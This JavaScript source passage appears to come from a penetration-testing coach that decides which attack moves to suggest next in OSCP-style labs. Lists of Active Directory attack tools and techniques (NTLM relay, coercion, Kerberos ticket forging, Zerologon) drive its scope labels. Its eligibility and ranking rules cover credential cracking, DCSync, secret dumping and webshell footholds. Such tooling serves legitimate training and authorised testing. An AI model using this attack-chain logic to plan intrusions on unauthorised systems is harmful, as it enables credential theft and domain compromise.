  var SCOPE_BEYOND_IDS = { 'nopac': 1, 'printnightmare': 1, 'ms14-068': 1, 'zerologon': 1, 'zerologon-exploit': 1 };
  var SCOPE_BEYOND_TOOLS = { 'zerologon-scan': 1, sharpwsus: 1, sharpsccm: 1, sccmhunter: 1 };
  var SCOPE_BEYOND_FACTS = { 'ad.zerologon': 1, 'ad.sid_history': 1 };
  var SCOPE_PLUS_TOOLS = { certipy: 1, pywhisker: 1, ntlmrelayx: 1, responder: 1, coercer: 1, mitm6: 1,
    'impacket-ticketer': 1, 'impacket-rbcd': 1, 'impacket-getst': 1,
    'petitpotam.py': 1, 'printerbug.py': 1, 'dfscoerce.py': 1, targetedkerberoast: 1 };
  // Note: credential.certificate is deliberately NOT a plus-fact - it is overloaded (an ADCS cert in AD,
  // but also a bare SSH key for ssh-key-login, which is core). ADCS is caught by the certipy tool + the
  // adcs.vulnerable gate instead. Likewise the id regex uses `shadow-cred`, not a bare `shadow`, so that
  // crack-shadow (cracking /etc/shadow - core OSCP) is not mistaken for the shadow-credentials attack.
  // Core PEN-200 / OSCP fundamentals (dcsync, bloodyad-acl, ad-acl-abuse, gmsa-read, gpo-abuse,
  // windows-service-dacl-abuse, smtp-open-relay) stay in core 'oscp'.
  var SCOPE_PLUS_FACTS = { 'adcs.vulnerable': 1, 'ad.coerced_auth': 1, 'ad.unconstrained': 1,
    'hash.krbtgt': 1, 'relay.success': 1 };
  var SCOPE_PLUS_ID_RE = /deleg|shadow-cred|rbcd|golden|silver|(?:ntlm|kerberos)-relay|relay-target|coerce|unconstrained|constrained/;
  function deriveScope(d) {
    if (d.scope) return d.scope;
    var id = String(d.id || '').toLowerCase();
    // Key the tool signal on the PRIMARY tool only - a secondary tool in the array (e.g. targetedKerberoast
    // listed alongside the standard GetUserSPNs Kerberoast) must not escalate an otherwise-core move.
    var primary = String((d.tool || (d.tools && d.tools[0]) || '')).toLowerCase();
    var reqAll = d.requires_all || [];
    var reqAny = d.requires_any || [];
    function hasGate(map) {
      return reqAll.some(function (g) { return map[g]; }) ||
        (reqAny.length > 0 && reqAny.every(function (g) { return map[g]; }));
    }
    if (SCOPE_BEYOND_IDS[id] || SCOPE_BEYOND_TOOLS[primary] || hasGate(SCOPE_BEYOND_FACTS)) return 'beyond';
    if (SCOPE_PLUS_ID_RE.test(id) || SCOPE_PLUS_TOOLS[primary] || hasGate(SCOPE_PLUS_FACTS)) return 'oscp+';
    return 'oscp';
  }
  function locusRank(l) { return l === 'R' ? 0 : (l === 'F' ? 1 : 2); }

  // ------------------------------------------------------------------ Action --
  function Action(d) {
    d = d || {};
    var cmds = d.commands || [];
    this.id = d.id;
    this.title = d.title || d.id;
    this.tool = d.tool || '';
    this.command = cmds.length ? cmds[0].run : (d.command || '');
    this.proves = d.proves || '';
    this.does_not_prove = d.does_not_prove || '';
    this.priority = parseInt(d.priority != null ? d.priority : 50, 10);
    this.phase = d.phase || '';
    this.autonomy = d.autonomy || '';
    this.requires_all = (d.requires_all || []).slice();
    this.requires_any = (d.requires_any || []).slice();
    this.credential_probe = d.credential_probe || null;
    this.obsoleted_by = (d.obsoleted_by || []).slice();
    this.deprioritize_when = (d.deprioritize_when || []).slice();
    this.produces = (d.produces || []).slice();
    this.hypothesis = d.hypothesis || '';
    this.tools = (d.tools || []).slice();
    this.os = (d.os || []).slice();
    this.report = d.report || null;
    this.refs = (d.refs || []).slice();
    this.commands = cmds.slice();
    this.sequence = !!d.sequence;
    // Explore-vs-Exploit: a DIAGNOSTIC move is a high-information opener that
    // collapses the search tree (a service scan, an AD orient, an SMB-anon or
    // web-stack probe). In the opening (explore mode) these lead, as data rather
    // than a per-move weight. `eliminates` names the uncertainty it rules in/out
    // (authored metadata; the ranker tiebreak keys on the boolean).
    this.diagnostic = !!d.diagnostic;
    this.eliminates = (d.eliminates || []).slice();
    // Kill-chain role for the state-transition bonuses in nextActionsV2. Authored
    // as DATA so a bonus keys on the move's role, not a fragile `id === '...'`
    // string that silently stops matching if the move is ever renamed. Values:
    //   crack / crack_tgs / crack_asrep · dcsync · privesc_act · foothold_win ·
    //   root_flag_win / user_flag_win · loot_browse · gpp · kerberoast ·
    //   map_acl / map_graph / map_manual.
    this.transition = d.transition || '';
    // A generic, non-AD-specific fallback (host LPE / tunnel) that must not
    // leapfrog the AD attack chain on an un-mapped Domain Controller. Authored as
    // data so the anti-thrash rule keys on the role, not a hardcoded id list.
    this.dcDefer = !!d.dcDefer;
    // A "try-if-vulnerable" move (an unconfirmed named-vuln check, coerce/relay,
    // open-relay probe): minted as a gamble, it must not outrank an evidenced
    // next step. Authored as data in place of the old id-name regex so a move's
    // speculative status travels with it rather than depending on its id spelling.
    this.speculative = !!d.speculative;
    this.timeout = parseInt(d.timeout || 0, 10) || 0;
    this.locus = deriveLocus(d);   // 'R' remote/offline · 'F' one-shot on-host · 'I' interactive on-host
    this.scope = deriveScope(d);   // 'oscp' · 'oscp+' · 'beyond' (newcomer-safe lens)
  }

  Action.prototype.producedKinds = function () { return new Set(this.produces); };

  var AUX_PRODUCED_RE = /^advice\.|^persistence\.|^listener\.|^tunnel\.|^enum\.deep$|^kerberos\.tickets$|^host\.kernel$|^host\.arch$|^host\.multihomed$/;
  var GENERIC_MULTI_KINDS = {
    'credential.available': 1, 'credential.plaintext': 1, 'credential.candidate': 1,
    'loot.files': 1, 'config.review': 1
  };
  var GENERIC_CRED_ONLY_KINDS = {
    'credential.available': 1, 'credential.plaintext': 1, 'credential.candidate': 1
  };

  function canUseFastHave(facts, preHave) {
    return !!(preHave && facts && root.OBOL && root.OBOL.facts && root.OBOL.facts.FactSet
      && facts.has === root.OBOL.facts.FactSet.prototype.has
      && facts.kinds === root.OBOL.facts.FactSet.prototype.kinds);
  }
  var _resolvedFactsCache = typeof WeakMap === 'function' ? new WeakMap() : null;
  function getResolvedFactsMemo(facts) {
    if (!_resolvedFactsCache || !facts || !facts._resolvedContext || !Array.isArray(facts.facts)) return null;
    if (!(root.OBOL && root.OBOL.facts && root.OBOL.facts.FactSet
      && facts.has === root.OBOL.facts.FactSet.prototype.has
      && facts.kinds === root.OBOL.facts.FactSet.prototype.kinds)) return null;
    var fLen = facts.facts.length;
    var scLen = Array.isArray(facts.state_changed) ? facts.state_changed.length : 0;
    var eng = facts._resolvedContext.engagement;
    var aLen = (eng && Array.isArray(eng.activities)) ? eng.activities.length : -1;
    var entry = _resolvedFactsCache.get(facts);
    if (!entry || entry.fLen !== fLen || entry.scLen !== scLen || entry.aLen !== aLen) {
      var proj = (scLen === 0 && facts._projBase && Array.isArray(facts._projBase.facts) && facts._projBase.facts.length === fLen)
        ? facts._projBase : null;
      var projMemo = proj ? _resolvedFactsCache.get(proj) : null;
      if (proj && (!projMemo || projMemo.fLen !== fLen)) {
        projMemo = {
          fLen: fLen,
          have: proj.kinds(),
          fam: hostOsFamily(proj)
        };
        _resolvedFactsCache.set(proj, projMemo);
      }
      entry = {
        fLen: fLen,
        scLen: scLen,
        aLen: aLen,
        have: projMemo ? projMemo.have : facts.kinds(),
        fam: projMemo ? projMemo.fam : hostOsFamily(facts),
        elig: new WeakMap(),
        settled: new WeakMap()
      };
      _resolvedFactsCache.set(facts, entry);
    }
    return entry;
  }

  function actionMayMatchCompletedActivity(action, facts) {
    var rc = facts && facts._resolvedContext;
    var frameInfos = rc && rc._frame && rc._frame.retirableActInfos;
    if (Array.isArray(frameInfos)) {
      if (!frameInfos.length) return false;
      var fMeta = v2GetActionMeta(action);
      var fPrefixes = fMeta.cmdPrefixes;
      var fWildcard = fMeta.cmdPrefixWildcard;
      for (var fi = 0; fi < frameInfos.length; fi++) {
        var info = frameInfos[fi];
        if (info.actionId === action.id) return true;
        if (fWildcard) return true;
        if (!fPrefixes.length) continue;
        var iHay = info.hay;
        for (var fpi = 0; fpi < fPrefixes.length; fpi++) {
          if (iHay.indexOf(fPrefixes[fpi]) >= 0) return true;
        }
      }
      return false;
    }
    var eng = rc && rc.engagement;
    if (!eng || !Array.isArray(eng.activities)) return true;
    var acts = eng.activities;
    if (!acts.length) return false;
    var meta = v2GetActionMeta(action);
    var prefixes = meta.cmdPrefixes;
    var wildcard = meta.cmdPrefixWildcard;
    for (var ai = 0; ai < acts.length; ai++) {
      var act = acts[ai];
      if (!act) continue;
      var ao = act.outcome;
      if (!ao) continue;
      if (!ao.retireCommand && !(ao.kind === 'success' && /(?:^|\s)--host\b/i.test(act.command || ''))) continue;
      if ((act.action_id || act.actionId) === action.id) return true;
      if (wildcard) return true;
      if (!prefixes.length) continue;
      var hay = (String(act.command || '') + '\n' + String(act.dispatch || '') + '\n' + (Array.isArray(act.sequenceCommands) ? act.sequenceCommands.join('\n') : '')).toLowerCase();
      for (var pi = 0; pi < prefixes.length; pi++) {
        if (hay.indexOf(prefixes[pi]) >= 0) return true;
      }
    }
    return false;
  }

  Action.prototype.settled = function (facts, preHave) {
    if (!facts) return false;
    var rMemo = !facts._checkingCredPool ? getResolvedFactsMemo(facts) : null;
    var sigBase = 0;
    if (rMemo) {
      sigBase = v2GetActionMeta(this).sigLen * 2;
      var cachedS = rMemo.settled.get(this);
      if (cachedS === sigBase + 2) return true;
      if (cachedS === sigBase + 1) return false;
    }
    var res = this._settledImpl(facts, rMemo ? rMemo.have : preHave);
    if (rMemo) rMemo.settled.set(this, sigBase + (res ? 2 : 1));
    return res;
  };

  Action.prototype._settledImpl = function (facts, preHave) {
    var action = this;
    var fastH = canUseFastHave(facts, preHave) ? preHave : null;
    var allScoped = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
      ? facts._resolvedContext.allScopedFacts : null;
    function valsOf(kind) {
      if (allScoped) {
        return allScoped.filter(function (f) { return f && f.state === 'supported' && f.kind === kind && f.value; }).map(function (f) { return f.value; });
      }
      return facts.values ? (facts.values(kind) || []) : [];
    }
    var applicable = null;
    function getApplicable() {
      if (applicable !== null) return applicable;
      applicable = [];
      if (facts._resolvedContext && actionBlockedByInvariantGate(action, facts, fastH)) return applicable;
      (action.commands || []).forEach(function (cmd, index) {
        var commandFacts = facts.forAction ? facts.forAction(action, cmd) : facts;
        var portOk = !root.OBOL || !root.OBOL.command || !root.OBOL.command.commandPortFeasible
          || root.OBOL.command.commandPortFeasible(cmd, commandFacts).feasible !== false;
        if (portOk && action.eligible(commandFacts) && commandIsEligible(cmd, commandFacts, action)) {
          applicable.push({ cmd: cmd, index: index });
        }
      });
      return applicable;
    }
    var allApplicableCompleted = false, someApplicableCompleted = false, someCleanCompleted = false;
    var appList = [];
    if (facts.context && facts.commandCompleted) {
      if (this.id === 'validate-credential' || actionMayMatchCompletedActivity(action, facts)) {
        appList = getApplicable();
        var cleanFn = facts.commandCompletedClean || facts.commandCompleted;
        someApplicableCompleted = appList.some(function (entry) { return facts.commandCompleted(action, entry.cmd, entry.index); });
        if (someApplicableCompleted) {
          someCleanCompleted = cleanFn === facts.commandCompleted ? true : appList.some(function (entry) { return cleanFn(action, entry.cmd, entry.index); });
          allApplicableCompleted = appList.length > 0 && appList.every(function (entry) { return facts.commandCompleted(action, entry.cmd, entry.index); });
        }
      }
    }
    if (this.id === 'validate-credential' && facts.context) {
      var isAlreadyAuth = facts.has('credential.validated') || facts.has('smb.authenticated')
        || facts.has('winrm.authenticated') || facts.has('ldap.authenticated')
        || facts.has('ssh.authenticated') || facts.has('rdp.authenticated') || facts.has('mssql.authenticated');
      if (isAlreadyAuth) return true;
      var vcTgt = facts.context.target || '';
      if (appList.length > 0 && !allApplicableCompleted) return false;
      var vcPorts = (root.OBOL && root.OBOL.command && root.OBOL.command.openPorts) ? root.OBOL.command.openPorts(facts, vcTgt) : [];
      if (appList.length === 0 && (!vcPorts || vcPorts.length === 0)) return false;
      if (!facts._checkingCredPool && facts.context.selectionSource === 'cross-host-reuse' && allScoped && root.OBOL && root.OBOL.context && root.OBOL.context.resolve) {
        var vcEng = facts._resolvedContext && facts._resolvedContext.engagement;
        var curCredId = facts.context.credentialId;
        var seenCandIds = Object.create(null);
        if (curCredId) seenCandIds[curCredId] = 1;
        for (var cfi = 0; cfi < allScoped.length; cfi++) {
          var cf = allScoped[cfi];
          if (!cf || cf.state !== 'supported' || cf.kind !== 'credential.available' || !cf.value) continue;
          var candMat = root.OBOL.context.material ? root.OBOL.context.material(cf.value, cf.scope) : null;
          var candId = (candMat && candMat.id) || cf.value.credentialId;
          if (!candId || seenCandIds[candId]) continue;
          seenCandIds[candId] = 1;
          var candResolved = root.OBOL.context.resolve({ engagement: vcEng, target: vcTgt, credentialId: candId, actionId: 'validate-credential' });
          if (candResolved && candResolved.facts) {
            candResolved.facts._checkingCredPool = true;
            var candSettled = action.settled(candResolved.facts);
            delete candResolved.facts._checkingCredPool;
            if (!candSettled) return false;
          }
        }
      }
      return true;
    }
    if (this.id === 'content-discovery' && root.OBOL && root.OBOL.command && root.OBOL.command.webOrigins) {
      var cdTgt = (facts.context && facts.context.target) || '';
      var cdEng = facts._resolvedContext && facts._resolvedContext.engagement;
      var woInfo = root.OBOL.command.webOrigins(facts, { target: cdTgt, engagement: cdEng });
      if (woInfo && woInfo.all && woInfo.all.length > 0) {
        return woInfo.unmapped.length === 0;
      }
    }
    if (allApplicableCompleted) return true;

    if (this.id === 'gpp-passwords' && facts.values) {
      var gppDone = valsOf('credential.plaintext').some(function (v) { return v && v.kind === 'gpp_plaintext'; })
        || valsOf('credential.available').some(function (v) { return v && (v.kind === 'gpp_plaintext' || v.method === 'gpp-decrypt' || v.via === 'gpp_password'); })
        || valsOf('credential.candidate').some(function (v) { return v && v.via === 'gpp_password' && v.password; });
      return !!gppDone;
    }
    if (this.id === 'laps-read' && facts.values) {
      var lapsDone = valsOf('ad.laps').some(function (v) { return v && (v.password || v.secret); })
        || valsOf('credential.available').concat(valsOf('credential.plaintext')).concat(valsOf('credential.candidate')).some(function (v) {
          return v && (/^laps/i.test(String(v.kind || '')) || v.via === 'laps' || v.method === 'laps');
        });
      return !!lapsDone;
    }
    if (this.id === 'gmsa-read' && facts.values) {
      var gmsaDone = valsOf('credential.available').concat(valsOf('credential.ntlm_hash')).concat(valsOf('credential.candidate')).some(function (v) {
        return v && (v.method === 'gmsa' || v.via === 'gmsa' || /^gmsa/i.test(String(v.kind || '')));
      });
      return !!gmsaDone;
    }
    if (this.id === 'dpapi-secrets' && facts.values) {
      var dpapiDone = valsOf('credential.available').concat(valsOf('credential.plaintext')).concat(valsOf('credential.candidate')).some(function (v) {
        return v && (/^dpapi/i.test(String(v.kind || '')) || v.method === 'dpapi' || v.via === 'dpapi');
      });
      return !!dpapiDone;
    }
    var sMeta = v2GetActionMeta(this);
    // Cracking actions (crack-tgs, crack-asrep, crack-ntlm, etc.) require specific hash evidence.
    // Once a matching hash is cracked (or terminal escalation is held), the crack move is settled
    // even if alternative cracking tools (john vs hashcat --show) were not run.
    if (sMeta.isCrackMove) {
      var reqHashes = sMeta.reqHashes;
      if (reqHashes.length > 0 && facts.has) {
        var fastH = canUseFastHave(facts, preHave) ? preHave : null;
        var hasHash = false;
        for (var rhi = 0; rhi < reqHashes.length; rhi++) {
          if (fastH ? fastH[reqHashes[rhi]] : facts.has(reqHashes[rhi])) { hasHash = true; break; }
        }
        if (hasHash) {
          var hasTgs = sMeta.reqHasTgs;
          var hasAsrep = sMeta.reqHasAsrep;
          var creds = valsOf('credential.available').concat(valsOf('credential.plaintext'));
          var cracked = creds.some(function (c) {
            if (!c) return false;
            var meth = (c.method || '').toLowerCase();
            var isCrack = meth.indexOf('crack') >= 0 || meth.indexOf('hashcat') >= 0 || meth.indexOf('john') >= 0;
            if (!isCrack) return false;
            var ht = String(c.hash_type || '').toLowerCase();
            if (hasTgs && ht && ht !== 'tgs' && ht !== 'krb5tgs') return false;
            if (hasAsrep && ht && ht !== 'asrep' && ht !== 'krb5asrep') return false;
            return true;
          });
          var mootByEscalation = fastH
            ? !!(fastH['access.admin'] || fastH['access.system'] || fastH['access.root'] || fastH['loot.ntds'])
            : (facts.has('access.admin') || facts.has('access.system') || facts.has('access.root') || facts.has('loot.ntds'));
          if (cracked || mootByEscalation) return true;
          return false;
        }
      }
    }
    if (facts.context && !sMeta.isObjectiveFlagOnly) {
      var eng = facts._resolvedContext && facts._resolvedContext.engagement;
      var tgtIp = facts.context.target || '';
      if (eng && Array.isArray(eng.activities)) {
        var latestAct = null;
        for (var mai = eng.activities.length - 1; mai >= 0; mai--) {
          var mAct = eng.activities[mai];
          if (mAct && (mAct.action_id || mAct.actionId) === action.id && (!tgtIp || !mAct.target || mAct.target === tgtIp)) {
            latestAct = mAct;
            break;
          }
        }
        if (latestAct) {
          if (latestAct.outcome && latestAct.outcome.kind === 'partial') return false;
          if ((this.commands || []).length === 1 && !someApplicableCompleted) return false;
        }
      }
    }
    // True once every produced kind is already proven - re-running gains no new facts.
    var rawPk = this.produces || [];
    if (!rawPk.length) return false;
    var pk = sMeta.settledPk;
    var have = canUseFastHave(facts, preHave) ? preHave : facts.kinds();
    if (!sMeta.hasPrimaryPk && facts.commandCompleted) {
      if (someCleanCompleted) return true;
    }
    if (this.id === 'bloodhound-collect' && (have['ad.graph.collected'] || have['ad.attack_paths'])) return true;
    if (this.id === 'ad-path-manual' && ((have['ad.attack_paths'] && have['ad.acl_lead']) || have['ad.control_paths'])) return true;
    if (this.id === 'bloodyad-acl' || this.id === 'ad-acl-abuse') {
      return !!(have['ad.control_paths'] || have['ad.domain_control'] || have['loot.ntds'] || have['access.admin']);
    }
    if ((this.id === 'linux-enum' || this.id === 'windows-enum') && !have['access.admin'] && !have['access.root'] && !have['access.system']) {
      var enumFhKind = this.id === 'linux-enum' ? 'foothold.linux' : 'foothold.windows';
      var enumFactList = allScoped || (facts.facts || []);
      var lastLeadsIdx = -1;
      var allFhUsers = Object.create(null), allFhCount = 0;
      for (var efi = 0; efi < enumFactList.length; efi++) {
        var ef = enumFactList[efi];
        if (!ef || (ef.state && ef.state !== 'supported')) continue;
        if (ef.kind === 'privesc.leads') lastLeadsIdx = efi;
        else if (ef.kind === enumFhKind && ef.value) {
          var rawFhU = String(ef.value.user || ef.value.identity || ef.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
          if (rawFhU && !/^(?:root|administrator|system|nt authority\\system)$/.test(rawFhU) && !allFhUsers[rawFhU]) {
            allFhUsers[rawFhU] = 1;
            allFhCount++;
          }
        }
      }
      if (allFhCount >= 2 && lastLeadsIdx >= 0) {
        var beforeLeadsUsers = Object.create(null);
        for (var bfi = 0; bfi <= lastLeadsIdx; bfi++) {
          var bf = enumFactList[bfi];
          if (!bf || (bf.state && bf.state !== 'supported') || bf.kind !== enumFhKind || !bf.value) continue;
          var bFhU = String(bf.value.user || bf.value.identity || bf.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
          if (bFhU) beforeLeadsUsers[bFhU] = 1;
        }
        for (var afi = lastLeadsIdx + 1; afi < enumFactList.length; afi++) {
          var af = enumFactList[afi];
          if (!af || (af.state && af.state !== 'supported') || af.kind !== enumFhKind || !af.value) continue;
          var aFhU = String(af.value.user || af.value.identity || af.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
          if (aFhU && !/^(?:root|administrator|system|nt authority\\system)$/.test(aFhU) && !beforeLeadsUsers[aFhU]) {
            return false;
          }
        }
      }
    }
    // Moves whose primary outputs are ONLY generic multi-instance kinds (credential.available,
    // credential.plaintext, credential.candidate, loot.files, config.review) must not settle merely
    // because an unrelated credential/loot fact exists from an earlier step.
    if (sMeta.onlyGenericCred || (sMeta.onlyGenericMulti && (facts.context || typeof facts.applicableCommands === 'function' || typeof facts.commandCompleted === 'function'))) {
      if (someCleanCompleted) return true;
      var anyGenericHeld = false;
      for (var gi0 = 0; gi0 < pk.length; gi0++) { if (have[pk[gi0]]) { anyGenericHeld = true; break; } }
      if (!anyGenericHeld) return false;
      var rawFactList = allScoped || (facts.facts || []);
      var hasMoveSpecificFact = false;
      for (var rfi = 0; rfi < rawFactList.length; rfi++) {
        var f = rawFactList[rfi];
        if (!f || f.state !== 'supported') continue;
        if (f.source === action.id) { hasMoveSpecificFact = true; break; }
        var v = f.value || {};
        if (v.action_id === action.id || v.via === action.id || v.method === action.id) { hasMoveSpecificFact = true; break; }
        if (action.id === 'password-spray' && /spray/i.test(String(v.method || v.via || ''))) { hasMoveSpecificFact = true; break; }
        if (action.id === 'keepass-dump-recover' && /keepass/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
        if (action.id === 'sccm-exploit' && /sccm/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
        if (action.id === 'vnc-decrypt' && /vnc/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
        if (action.id === 'cisco-decrypt' && /cisco/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
      }
      if (!hasMoveSpecificFact) return false;
    }
    var allHeld = true;
    for (var i = 0; i < pk.length; i++) { if (!have[pk[i]]) { allHeld = false; break; } }
    if (allHeld) return true;
    // Multi-OS / multi-foothold moves (e.g. produces both foothold.linux and foothold.windows)
    // cannot prove both OS footholds on a single host. Treat an OS-foothold output as satisfied
    // once any full OS foothold (foothold.linux or foothold.windows) is held, a webshell/shell
    // output as satisfied once that shell or a full OS foothold is held, and an admin/system/root
    // output as satisfied once any admin/system/root fact is held.
    var hasOsFoot = !!(have['foothold.linux'] || have['foothold.windows']);
    var hasAdmin = !!(have['access.admin'] || have['access.system'] || have['access.root']);
    var reqHasFoot = sMeta.reqHasFoot;
    var reqHasAdmin = sMeta.reqHasAdmin;
    for (var j = 0; j < pk.length; j++) {
      var k = pk[j];
      if (have[k]) continue;
      if ((k === 'foothold.linux' || k === 'foothold.windows') && hasOsFoot && !reqHasFoot) continue;
      if (k === 'foothold.webshell' && hasOsFoot) continue;
      if (k === 'access.shell' && hasOsFoot && !reqHasFoot) continue;
      if ((k === 'access.admin' || k === 'access.system' || k === 'access.root') && hasAdmin && !reqHasAdmin) continue;
      if (this.id === 'file-upload' && k === 'foothold.webshell' && have['web.upload_confirmed']) continue;
      if ((this.id === 'manual-sqli-exploitation' || this.id === 'sqlmap-automation') && (k === 'foothold.webshell' || k === 'credential.candidate') && (have['db.creds'] || have['credential.available'])) continue;
      if (this.id === 'dump-secrets') {
        if (k === 'loot.ntds' && (have['loot.sam'] || have['loot.lsa'] || have['hash.ntlm']) && !have['ad.dc_candidate'] && !have['ad.domain_controller']) continue;
        if (k === 'credential.candidate' && (have['credential.available'] || have['hash.ntlm'] || have['loot.sam'] || have['loot.ntds'])) continue;
      }
      if (this.id === 'capabilities' && k === 'loot.files' && hasAdmin) continue;
      if (this.id === 'suid-gtfobins' && k === 'privesc.leads' && hasAdmin) continue;
      if (k === 'proof.captured' && ((pk.indexOf('objective.root_flag') >= 0 && have['objective.root_flag']) || (pk.indexOf('objective.local_flag') >= 0 && have['objective.local_flag']))) continue;
      return false;
    }
    return true;
  };

  Action.prototype.obsolete = function (facts, preHave) {
    // True once a later achievement makes this move pointless - e.g. the coercion→relay lane is moot
    // after a completed DCSync (loot.ntds). Retired like a settled move: dropped from the ready list and
    // the blocked list alike, so the coach stops steering you toward a means to an end you already hold.
    if (canUseFastHave(facts, preHave)) {
      for (var j = 0; j < this.obsoleted_by.length; j++) { if (preHave[this.obsoleted_by[j]]) return true; }
      return false;
    }
    for (var i = 0; i < this.obsoleted_by.length; i++) { if (facts.has(this.obsoleted_by[i])) return true; }
    return false;
  };

  var DEPRIORITIZE_PENALTY = 40;
  var ACTIONABLE_PRIVESC_VULN_RE = /^vuln\.(jdwp|screen_suid|dirtypipe|dirtycow|polkit|baron_samedit|chkrootkit)$/;
  function hasConcretePrivescVector(facts) {
    if (!facts || typeof facts.kinds !== 'function') return false;
    var kinds = facts.kinds();
    for (var k in kinds) {
      if ((/^privesc\./.test(k) && k !== 'privesc.leads') || ACTIONABLE_PRIVESC_VULN_RE.test(k)) return true;
    }
    return false;
  }
  Action.prototype.effectivePriority = function (facts) {
    // Base priority, minus a penalty once a fact makes this move a side-quest rather than the point - e.g.
    // post-domain-admin persistence / path-mapping / pivots sink below the objective (flag capture) and the
    // cross-box loot once you already hold loot.ntds. The move stays AVAILABLE, just no longer up top.
    var p = this.priority;
    for (var i = 0; i < this.deprioritize_when.length; i++) { if (facts.has(this.deprioritize_when[i])) { p -= DEPRIORITIZE_PENALTY; break; } }
    if ((this.id === 'windows-enum' || this.id === 'linux-enum') && hasConcretePrivescVector(facts)) {
      p -= 25;
    }
    return p;
  };

  // Authored alternatives allow a command to TEST likely privileged material.
  // They grant no access facts and never authorize commands inside an existing
  // session. Resolved views already restrict material to the selected identity.
  function credentialProbeAllowed(action, facts) {
    var rule = action && action.credential_probe;
    if (!rule || !facts || !facts.values) return false;
    if (facts.context && !facts.context.credentialId) return false;
    var users = rule.users || [], methods = rule.methods || [];
    return facts.values('credential.available').some(function (v) {
      if (!v || !(v.password || v.nthash || v.hash)) return false;
      var user = String(v.user || '').toLowerCase().replace(/^.*[\\/]/, '');
      return users.indexOf(user) >= 0 || methods.indexOf(v.method || '') >= 0;
    });
  }

  var HTTP_SURFACE_PORT_KINDS = ['port:80', 'port:443', 'port:8080', 'port:8443', 'port:8000', 'port:8888'];
  function hasActionReqKind(action, hasFn, reqKind) {
    if (hasFn(reqKind)) return true;
    if (reqKind === 'http.reachable' && action && action.id === 'ftp-webroot-upload-webshell') {
      for (var p = 0; p < HTTP_SURFACE_PORT_KINDS.length; p++) {
        if (hasFn(HTTP_SURFACE_PORT_KINDS[p])) return true;
      }
    }
    return false;
  }

  var CONTEXT_SENSITIVE_KIND_RE = /^(?:access\.(?:admin|system|root)$|credential\.|(?:smb|ldap|winrm|ssh|rdp|mssql)\.authenticated$|blocker\.)/;
  function actionNeedsForActionContext(action, facts, fastHave) {
    if (action.credential_probe) return true;
    if (action.id === 'win-interactive-shell' || action.id === 'ad-user-enum') return true;
    var hasWinrmOrRdp = fastHave
      ? !!(fastHave['winrm.authenticated'] || fastHave['rdp.authenticated'])
      : (facts.has('winrm.authenticated') || facts.has('rdp.authenticated'));
    if (action.os && action.os.length && hasWinrmOrRdp) return true;
    return v2GetActionMeta(action).hasCtxGate;
  }
  function actionBlockedByInvariantGate(action, facts, fastHave, preFam) {
    var meta = v2GetActionMeta(action);
    var hasWinrmOrRdp = fastHave
      ? !!(fastHave['winrm.authenticated'] || fastHave['rdp.authenticated'])
      : (facts.has('winrm.authenticated') || facts.has('rdp.authenticated'));
    if (action.os && action.os.length && facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !hasWinrmOrRdp) {
      var osOk = preFam !== undefined ? osCompatibleWithFamily(facts, preFam, action.os, action) : osCompatible(facts, action.os, action);
      if (!osOk) return true;
    }
    var hasFactFn = null, i, reqAllCtx = meta.reqAllCtx;
    for (i = 0; i < action.requires_all.length; i++) {
      if (reqAllCtx[i]) continue;
      var rk = action.requires_all[i];
      var hasRk = fastHave ? !!fastHave[rk] : facts.has(rk);
      if (!hasRk) {
        if (rk === 'http.reachable') {
          if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
          if (hasActionReqKind(action, hasFactFn, rk)) continue;
        }
        return true;
      }
    }
    if (action.requires_any.length && !action.credential_probe) {
      var anyPossible = false, reqAnyCtx = meta.reqAnyCtx;
      for (i = 0; i < action.requires_any.length; i++) {
        if (reqAnyCtx[i]) { anyPossible = true; break; }
        var yk = action.requires_any[i];
        if (fastHave ? fastHave[yk] : facts.has(yk)) { anyPossible = true; break; }
      }
      if (!anyPossible) return true;
    }
    return false;
  }

  Action.prototype.eligible = function (facts, preHave, preFam) {
    var rMemo = getResolvedFactsMemo(facts);
    var sigBase = 0;
    if (rMemo) {
      sigBase = v2GetActionMeta(this).sigLen * 2;
      var cachedE = rMemo.elig.get(this);
      if (cachedE === sigBase + 2) return true;
      if (cachedE === sigBase + 1) return false;
    }
    var res = this._eligibleImpl(facts, rMemo ? rMemo.have : preHave, rMemo ? rMemo.fam : preFam);
    if (rMemo) rMemo.elig.set(this, sigBase + (res ? 2 : 1));
    return res;
  };

  Action.prototype._eligibleImpl = function (facts, preHave, preFam) {
    var fastHave = canUseFastHave(facts, preHave) ? preHave : null;
    if (facts && facts.forAction && (!facts.context || facts.context.actionId !== this.id)) {
      if (facts._resolvedContext) {
        if (actionBlockedByInvariantGate(this, facts, fastHave, preFam)) return false;
        if (!(facts._resolvedContext.locus === 'overview' && !actionNeedsForActionContext(this, facts, fastHave))) {
          var action = this, candidates = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
          return candidates.some(function (candidate) { return action.eligible(candidate); });
        }
      } else {
        var action2 = this, candidates2 = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
        return candidates2.some(function (candidate) { return action2.eligible(candidate); });
      }
    }
    // True when the target's OS and proven facts satisfy this action's prerequisites.
    var osOk2 = (fastHave && preFam !== undefined) ? osCompatibleWithFamily(facts, preFam, this.os, this) : osCompatible(facts, this.os, this);
    if (!osOk2) return false;
    var hasFactFn = null;
    for (var i = 0; i < this.requires_all.length; i++) {
      var rk2 = this.requires_all[i];
      if (fastHave ? fastHave[rk2] : facts.has(rk2)) continue;
      if (rk2 === 'http.reachable') {
        if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
        if (hasActionReqKind(this, hasFactFn, rk2)) continue;
      }
      return false;
    }
    if (this.requires_any.length) {
      var any = false;
      for (var j = 0; j < this.requires_any.length; j++) {
        var yk2 = this.requires_any[j];
